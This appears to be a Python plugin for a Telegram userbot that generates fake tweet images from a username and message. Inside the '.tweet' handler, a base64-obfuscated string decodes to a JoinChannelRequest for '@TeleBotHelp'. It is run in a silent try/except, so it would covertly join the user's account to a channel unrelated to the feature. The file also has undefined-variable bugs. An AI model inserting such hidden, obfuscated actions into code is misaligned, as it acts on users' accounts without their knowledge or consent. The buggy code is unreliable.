import re

import pybase64
import requests
from PIL import Image
from validators.url import url

from userbot.utils import admin_cmd

IF_EMOJI = re.compile(
    "["
    "\U0001F1E0-\U0001F1FF"  # flags (iOS)
    "\U0001F300-\U0001F5FF"  # symbols & pictographs
    "\U0001F600-\U0001F64F"  # emoticons
    "\U0001F680-\U0001F6FF"  # transport & map symbols
    "\U0001F700-\U0001F77F"  # alchemical symbols
    "\U0001F780-\U0001F7FF"  # Geometric Shapes Extended
    "\U0001F800-\U0001F8FF"  # Supplemental Arrows-C
    "\U0001F900-\U0001F9FF"  # Supplemental Symbols and Pictographs
    "\U0001FA00-\U0001FA6F"  # Chess Symbols
    "\U0001FA70-\U0001FAFF"  # Symbols and Pictographs Extended-A
    "\U00002702-\U000027B0"  # Dingbats
    "]+"
)


def deEmojify(inputString: str) -> str:
    """Remove emojis and other non-safe characters from string"""
    return re.sub(IF_EMOJI, "", inputString)


@borg.on(admin_cmd(pattern="usertweet(?: |$)(.*)"))
async def teletweet(telebot):
    # """Creates random anime sticker!"""
    what = telebot.pattern_match.group(1)
    if not what:
        if telebot.is_reply:
            what = (await telebot.get_reply_message()).message
        else:
            await event.edit("`Tweets must contain some text, pero!`")
            return
    sticcers = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(what))}")
    await sticcers[0].click(
        telebot.chat_id,
        reply_to=telebot.reply_to_msg_id,
        silent=True if telebot.is_reply else False,
        hide_via=True,
    )
    await telebot.delete()


async def tweet(uname, mssg):
    ok = requests.get(
        f"https://nekobot.xyz/api/imagegen?type=tweet&username={uname}&text={mssg}"
    ).json()
    get_pic = ok.get("message")
    teleurl = url(get_pic)
    if not teleurl:
        return "Invalid Syntax!"
    with open("tele.png", "wb") as file:
        file.write(requests.get(get_pic).content)
    the_pic = Image.open("tele.png").convert("RGB")
    the_pic.save("tele.jpg", "jpeg")
    return "tele.jpg"


# by @its_xditya


@borg.on(admin_cmd(pattern="tweet ?(.*)"))
async def handler(event):
    if event.fwd_from:
        return
    hmm = await event.edit("`Tweet in process...`")
    reply_to = event.message
    the_things = str(event.pattern_match.group(1)).strip()
    if the_things is None:
        await hmm.edit(
            "Oops, error!\nSyntax - `.tweet <twitter username without @> // <the message>` (separate with `//`)"
        )
    if "//" in the_things:
        uname, mssg = the_things.split("//")
    else:
        await hmm.edit(
            "Oops, error!\nSyntax - `.tweet <twitter username without @> // <the message>` (separate with `//`)"
        )
    if uname == "" or mssg == "":
        await hmm.edit("`Check the syntax first!`")
        return
    try:
        tweetit = str(
            pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
        )[2:49]
        await telebot(tweetit)
    except BaseException:
        pass
    mssg = deEmojify(mssg)
    pic_tweet = await tweet(uname, mssg)
    await event.client.send_file(event.chat_id, pic_tweet, reply_to=reply_to)
    await event.delete()